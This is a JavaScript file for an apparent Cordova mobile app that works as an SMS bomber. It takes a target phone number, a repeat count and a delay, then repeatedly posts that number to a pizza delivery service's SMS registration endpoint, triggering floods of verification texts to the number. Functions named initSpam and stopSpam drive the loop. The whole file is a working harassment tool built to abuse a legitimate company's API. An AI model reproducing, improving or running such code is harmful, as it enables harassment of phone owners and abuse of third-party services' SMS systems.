
var inputBox = document.getElementById("numberForm");
var repeatBox = document.getElementById("repeatForm");
var statusAlert = document.getElementById("status-alert");
var phone, servicesBase;
var repeat = document.getElementById("repeatForm");
var delay = document.getElementById("delayForm");
var app = {};
app.iterated = 0;
app.status = false;
app.globaldescr = false;
var invalidChars = [
  "-",
  "+",
  "e",
];

inputBox.addEventListener("input", function() {
  this.value = this.value.replace(/[e\+\-]/gi, "");
});

inputBox.addEventListener("keydown", function(e) {
  if (invalidChars.includes(e.key)) {
    e.preventDefault();
  }
});

repeatBox.addEventListener("input", function() {
  this.value = this.value.replace(/[e\+\-]/gi, "");
});

repeatBox.addEventListener("keydown", function(e) {
  if (invalidChars.includes(e.key)) {
    e.preventDefault();
  }
});
function beauty(number) {
	return number.substring(0,2) + " " +"(" + number.substring(2,5) + ")" + " " + number.substring(5,8)+"-"+number.substring(8,10)+"-"+number.substring(10,12);
}
function initSpam() {
	try {
		if (!app.status ) { //ТУТ ДОХУЯ УСЛОВИЙ НА ПРОВЕРКУ НАДА ДЕДУ
			phone = "+" + document.getElementById("numberForm").value;
			servicesBase = [
				{ name:"PIZZAPROSTO", req:"post", url:"https://api.pizza-prosto.ru/P_login_sms", type:"urlencoded", data:{'action':'registration','phone':phone.replace("+7","")} }
			];
			document.getElementById("startButton").innerHTML = "Остановить";
			statusAlert.innerHTML = "Enabled";
			statusAlert.className = "alert alert-success text-center mx-auto mt-3 status-alert";
			app.status = true;
			app.iterated = 0;
			app.globaldescr = true;
			for (let i = 0; i < repeat.value; i++) {
				if (app.status) {
					app.globaldescr = setTimeout(childloop, (delay.value * servicesBase.length) * i);
				}
			}
		} else if (app.status) { 
			stopSpam();
		}
	} catch(e) { alert(e.stack); }
	
}

function childloop() {
	if (app.status) {
		servicesBase.forEach(function(item, i, arr) {
   			let k = i;
    		app.descr = setTimeout(function(){
       			requestSender( phone, item.type, item.url, item.data, item.name, item.req );
       			++app.iterated;
    			if ( app.iterated >= repeat.value * servicesBase.length) {console.log("ALL"); stopSpam();}
    		}, delay.value * (k + 1));
		});
	}
}

function stopSpam() {
	app.iterated = 3;
	app.status = false;
	clearTimeout(app.descr);
	clearTimeout(app.globaldescr);
	document.getElementById("startButton").innerHTML = "Начать";
	statusAlert.innerHTML = "Disabled";
	statusAlert.className = "alert alert-danger text-center mx-auto mt-3 status-alert";

}
function requestSender(number,type,url,data,name,req) {
  if (req=="post") {
	  cordova.plugin.http.setRequestTimeout(2.0);
	  cordova.plugin.http.setDataSerializer(type);
	  cordova.plugin.http.post(url, data, { Authorization: 'OAuth2: token' }, function(response) {
	    // prints 200
	    console.log(response.status);
	    try {
	      response.data = JSON.parse(response.data);
	      // prints test
	      console.log(response.data.message);
	    } catch(e) {
	      console.error('JSON parsing error');
	    }
	  }, function(response) {
	    // prints 403
	    console.log(response.status);
	   
	    //prints Permission denied
	    console.log(response.error);
	  });
	} else if (req=="get") {
		cordova.plugin.http.setRequestTimeout(2.0);
	  	cordova.plugin.http.setDataSerializer(type);
		cordova.plugin.http.get(url, {}, { Authorization: 'OAuth2: token' }, function(response) {
		  console.log(response.status);
		}, function(response) {
		  console.error(response.error);
		});
	}
  	
}

function toggleTheme(theme) {
	window.localStorage.setItem('theme', theme);
	window.location.replace(theme+"_index.html");
}

function localClear() {
	window.localStorage.clear();
}
